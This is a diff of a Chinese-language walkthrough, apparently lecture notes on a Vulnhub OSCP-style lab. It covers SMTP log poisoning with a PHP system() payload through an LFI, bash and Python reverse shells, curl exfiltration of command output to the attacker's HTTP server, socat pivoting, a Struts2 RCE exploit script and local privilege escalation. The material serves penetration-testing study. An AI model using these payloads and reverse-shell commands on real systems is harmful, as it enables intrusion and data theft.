@@ -16,36 +16,19 @@ description: 通过 SMTP 日志投毒结合 LFI 实现 PHP 代码执行，获取
   - Struts2 远程命令执行
   - Linux 内核漏洞提权
 - 工具清单：Nmap、smtp-user-enum、Gobuster、Burp Suite、Socat、SearchSploit、Netcat
+- 来源：听课笔记 from Zumpyx_OSCP-Like Vulnhub Machines_系列
 
 ---
 
 ## 一、信息收集
 
-### 1. 主机发现
-
-首先进行网段存活探测，确定靶机 IP
+### 1. 主机发现&端口探测
 
 ```shell
 nmap -sn 192.168.56.1/24 --min-rate 10000
-```
-
-发现靶机 IP 为 `192.168.56.102`，记为靶机 A
-
-### 2. 端口扫描
-
-先进行全端口扫描，再对开放端口进行详细服务探测
-
-```shell
 IP=192.168.56.102
-
-# 全端口扫描
-nmap -p- -T5 $IP
-
-# 服务及版本探测
-nmap -A -T4 -oN nmap.txt $IP -p 25,80,3000
+nmap -A -T4 -oN nmap.txt $IP -p `nmap -p- -T5 $IP | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ','`
 ```
-
-扫描结果：
 
 ![image-20261117172813661](image-20261117172813661.png)
 
@@ -57,7 +40,7 @@ nmap -A -T4 -oN nmap.txt $IP -p 25,80,3000
 | 80 | HTTP | Web 服务 |
 | 3000 | HTTP | Web 服务 |
 
-### 3. SMTP 用户枚举
+### 2. SMTP 用户枚举
 
 针对 25 端口的 SMTP 服务，可以使用 `smtp-user-enum` 进行用户枚举
 
@@ -67,7 +50,7 @@ smtp-user-enum -M RCPT -t 192.168.56.102 -u root
 
 此处暂未获得有效突破，但需要注意 SMTP 服务可能产生的邮件日志，后续可以结合文件包含漏洞进一步分析
 
-### 4. Web 目录扫描
+### 3. Web 目录扫描
 
 对 80 端口进行目录扫描
 
@@ -93,7 +76,7 @@ gobuster dir \
 
 进一步分析发现，该页面用于监控靶机不同网卡的网络流量
 
-从页面中获取到一个 URI：
+发现该靶机的一个 URI 的访问记录：
 
 ```text
 turing-bolo
@@ -173,7 +156,9 @@ http://192.168.56.102/turing-bolo
 
 这说明 `bolo` 参数存在本地文件包含（LFI）的利用可能
 
-之前读取 `/etc/passwd` 未得到结果，并不能直接归因于文件权限问题。不同日志文件的读取结果也可能受到文件路径、应用程序处理逻辑等因素影响
+之前读取 `/etc/passwd` 未得到结果，可能是文件权限问题
+
+也可能受到文件路径、应用程序处理逻辑等因素影响
 
 ### 4. SMTP 日志投毒
 
@@ -247,9 +232,7 @@ smtp-user-enum -M RCPT -t 192.168.56.102 \
 -u '<?php system($_POST[0]); phpinfo();?>'
 ```
 
-注意：在 Linux Shell 中，`$` 会被识别为变量展开符，因此需要使用单引号保护 PHP 代码，避免 `$ _POST` 中的变量被 Shell 提前解析
-
-此时可以通过 HTTP POST 参数 `0` 执行系统命令
+> 注意：在 Linux Shell 中，`$` 会被识别为变量展开符，因此需要使用单引号保护 PHP 代码，避免 `$ _POST` 中的变量被 Shell 提前解析
 
 首先在攻击机启动 Netcat 监听：
 
@@ -263,13 +246,15 @@ nc -lvnp 2233
 0=sh -i >& /dev/tcp/192.168.56.1/2233 0>&1
 ```
 
-请求时需要进行 URL 编码，但未能成功建立反弹连接
+> 请求时需要进行 URL 编码
+
+未能成功建立反弹连接，可惜
 
 此时不能直接判断靶机禁止网络通信，需要区分命令执行、出站连接及反弹 Shell 本身的执行条件
 
 ### 6. 验证命令执行与信息外带
 
-为了确认命令是否能够正常执行，在攻击机启动临时 HTTP 服务：
+为了确认相关网络通信命令是否能够正常执行，在攻击机启动临时 HTTP 服务：
 
 ```shell
 python -m http.server --bind 0.0.0.0 80
@@ -299,9 +284,9 @@ python -m http.server --bind 0.0.0.0 80
 
 ### 7. 获取反弹 Shell
 
-继续尝试通过 Bash 建立反弹连接，但未成功
+在 curl 的基础上尝试通过 Bash 建立反弹连接，但未成功
 
-随后通过 HTTP 信息外带检查 Python 环境：
+随后通过 HTTP 信息外带检查 Python 环境，尝试 python 相关反弹 Shell
 
 ```shell
 0=curl http://192.168.56.1/`which python`
@@ -315,9 +300,9 @@ python -m http.server --bind 0.0.0.0 80
 
 因此改用 Python 建立反弹 Shell，最终成功获得靶机 A 的 Shell
 
-![image-20261117185717717](image-20261117185717717.png)
-
 ![image-20261117185950545](image-20261117185950545.png)
+
+![image-20261117185717717](image-20261117185717717.png)
 
 ### 8. Shell 基础优化
 
@@ -352,7 +337,7 @@ cat /etc/passwd | grep home
 
 # 查看用户家目录
 cd /home
-ls -lRa
+ls -lRa   # -R 递归读取
 
 # 查看进程
 ps -ef
@@ -393,8 +378,7 @@ searchsploit screen
 发现本地权限提升漏洞：
 
 ```text
-Linux Local Privilege Escalation
-linux/local/41154.sh
+Linux Local Privilege Escalation        linux/local/41154.sh
 ```
 
 导出漏洞利用脚本：
@@ -441,8 +425,8 @@ cd /root
 
 发现以下文件：
 
-- `flag.txt`：疑似加密信息
-- `note.txt`：包含后续渗透的重要提示
+- `flag.txt`：内容疑似加密信息（其实就是个 flag 凭据）
+- `note.txt`：包含后续渗透的重要提示，`struts2_2.3.15.1-showcase`
 - 其他关键文件及其绝对路径
 
 结合后续发现的内网主机及 Struts2 服务，可以确定这些信息是为进一步渗透提供线索
@@ -507,7 +491,7 @@ nc -v -z -w2 10.10.10.6 1-65535
 which socat
 ```
 
-发现 Socat 已经存在
+发现 Socat 存在
 
 由于攻击机无法直接访问 `10.10.10.6`，可以在靶机 A 上建立 TCP 端口转发，将靶机 A 的监听端口转发到靶机 B 对应端口
 
@@ -521,45 +505,42 @@ socat TCP-LISTEN:8080,fork TCP:10.10.10.6:8080 &
 socat TCP-LISTEN:34483,fork TCP:10.10.10.6:34483 &
 ```
 
-参数说明：
-
-- `TCP-LISTEN`：在本机创建 TCP 监听端口
-- `fork`：每接受一个连接便创建子进程处理，允许多个连接
-- `TCP`：将连接转发到指定目标地址及端口
-- `&`：将进程放入后台运行
+> 参数说明：
+> 
+> - `TCP-LISTEN`：在本机创建 TCP 监听端口
+> - `fork`：每接受一个连接便创建子进程处理，允许多个连接
+> - `TCP`：将连接转发到指定目标地址及端口
+> - `&`：将进程放入后台运行
 
 此时建立的转发关系：
 
 ```text
-攻击机
-192.168.56.1
+攻击机，192.168.56.1
     |
-    | 访问靶机 A 的开放端口
+    | 访问靶机 A 的开放端口，如8009
     v
-靶机 A
-192.168.56.102
+靶机 A，192.168.56.102:8009
     |
     | socat 端口转发
     v
-靶机 B
-10.10.10.6
+靶机 B，10.10.10.6:8009
 ```
 
-检查监听状态：
-
-```shell
-netstat -lntp
-```
-
-![image-20261118171709157](image-20261118171709157.png)
-
-![image-20261118165623372](image-20261118165623372.png)
+> 检查监听状态：
+> 
+> ```shell
+> netstat -lntp
+> ```
+> 
+> ![image-20261118171709157](image-20261118171709157.png)
+> 
+> ![image-20261118165623372](image-20261118165623372.png)
 
 ### 6. 通过端口转发探测内网服务
 
 端口转发建立后，攻击机可以直接访问靶机 A 的对应端口，实际连接会由 Socat 转发至靶机 B
 
-因此，可以在攻击机上对转发后的端口进行服务探测：
+因此，可以在攻击机上对转发后的端口进行**服务探测**：
 
 ```shell
 nmap -sVC -p 8009,8080,34483 192.168.56.102 -Pn
@@ -611,9 +592,9 @@ http://192.168.56.102:8080/struts2_2.3.15.1-showcase/showcase_action
 shell.jsp
 ```
 
-在响应包中查看上传文件的位置
+拦截响应包并查看上传文件后的位置
 
-但发现服务端对上传文件的后缀进行了修改，未能直接获得可解析的 JSP WebShell
+但发现服务端对上传文件的后缀进行了修改，未能直接获得可解析的 JSP WebShell 后缀
 
 ![image-20261118170544452](image-20261118170544452.png)
 
@@ -640,6 +621,13 @@ searchsploit -m 42324
 ```
 
 该脚本用于利用对应 Struts2 漏洞实现远程命令执行
+
+形式如下：
+```shell
+python 42324.py \
+http://10.10.10.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action \
+"cmd"
+```
 
 ### 4. 配置反弹 Shell 网络通道
 
@@ -686,19 +674,16 @@ http://10.10.10.5:88/
 两条通道的关系：
 
 ```text
-靶机 B
-10.10.10.6
+靶机 B，10.10.10.6
     |
     | 反弹 Shell：2234
     | 文件下载：88
     v
-靶机 A
-10.10.10.5
+靶机 A，10.10.10.5
     |
     | socat 转发
     v
-攻击机
-192.168.56.1
+攻击机，192.168.56.1
     |
     +---- 2234：Netcat 监听
     |
@@ -715,7 +700,7 @@ http://10.10.10.5:88/
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.5/2234 0>&1'
 ```
 
-注意：这里的反弹目标是靶机 A 的内网 IP `10.10.10.5`，而不是攻击机的 `192.168.56.1`，因为已经在靶机 A 上配置了对应的 Socat 转发
+> 注意：这里的反弹目标是靶机 A 的内网 IP `10.10.10.5`，而不是攻击机的 `192.168.56.1`，因为已经在靶机 A 上配置了对应的 Socat 转发
 
 ### 6. 利用 Struts2 RCE 执行命令
 
@@ -745,37 +730,37 @@ http://10.10.10.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action
 "sh /tmp/2.sh"
 ```
 
+![image-20261118173947946](image-20261118173947946.png)
+
 攻击机成功接收到反弹连接，获得靶机 B 的 Shell
 
 ![image-20261118172547152](image-20261118172547152.png)
 
-![image-20261118173947946](image-20261118173947946.png)
-
-### 7. 命令执行结果外带补充
-
-除了通过反弹 Shell 获取交互式终端，也可以通过 HTTP 请求外带命令执行结果
-
-例如：
-
-```shell
-python 42324.py \
-http://10.10.10.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action \
-"curl http://10.10.10.5:88/`whoami`"
-```
-
-可以在攻击机 HTTP 服务日志中观察到请求路径中的用户名
-
-曾尝试对命令进行 URL 编码：
-
-```shell
-python 42324.py \
-http://10.10.10.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action \
-"curl http://10.10.10.5:88/%60whoami%60"
-```
-
-但编码后未能达到预期效果
-
-最终仍采用脚本下载与 Netcat 反弹 Shell 的方式获得交互式终端
+> ### 命令执行结果外带补充
+> 
+> 除了通过反弹 Shell 获取交互式终端，也可以通过 HTTP 请求外带命令执行结果
+> 
+> 例如：
+> 
+> ```shell
+> python 42324.py \
+> http://10.10.10.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action \
+> "curl http://10.10.10.5:88/`whoami`"
+> ```
+> 
+> 可以在攻击机 HTTP 服务日志中观察到请求路径中的用户名
+> 
+> 曾尝试对命令进行 URL 编码：
+> 
+> ```shell
+> python 42324.py \
+> http://10.10.10.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action \
+> "curl http://10.10.10.5:88/%60whoami%60"
+> ```
+> 
+> 但编码后未能达到预期效果
+> 
+> 最终仍采用脚本下载与 Netcat 反弹 Shell 的方式获得交互式终端
 
 ## 六、靶机 B 权限提升
 
@@ -888,8 +873,7 @@ chmod +x 1.elf
 ### 1. 完整攻击链
 
 ```text
-攻击机
-192.168.56.1
+攻击机，192.168.56.1
     |
     v
 靶机 A：192.168.56.102
